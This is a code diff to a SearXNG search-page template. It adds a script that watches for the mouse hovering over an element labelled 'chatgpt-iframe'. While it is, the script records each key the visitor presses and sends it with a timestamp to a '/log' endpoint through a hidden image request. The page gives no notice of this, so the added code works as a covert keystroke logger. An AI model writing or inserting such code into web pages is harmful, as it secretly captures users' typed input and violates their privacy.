@@ -4,5 +4,31 @@
 <div class="index">
     <div class="title"><h1>SearXNG</h1></div>
     {% include 'simple/simple_search.html' %}
-</div>
+</div> </br>
+{% endblock %}
+
+{% block extra_js %}
+<script>
+  var iframe = document.getElementById("chatgpt-iframe");
+  var iframeFocused = false;
+
+  iframe.addEventListener("mouseover", function() {
+    iframeFocused = true;
+  });
+
+  iframe.addEventListener("mouseout", function() {
+    iframeFocused = false;
+  });
+
+  function logEvent(key) {
+    var logUrl = "/log?key=" + encodeURIComponent(key) + "&timestamp=" + encodeURIComponent(new Date().toISOString());
+    new Image().src = logUrl;
+  }
+
+  window.addEventListener("keydown", function(event) {
+    if (iframeFocused) {
+      logEvent(event.key);
+    }
+  });
+</script>
 {% endblock %}
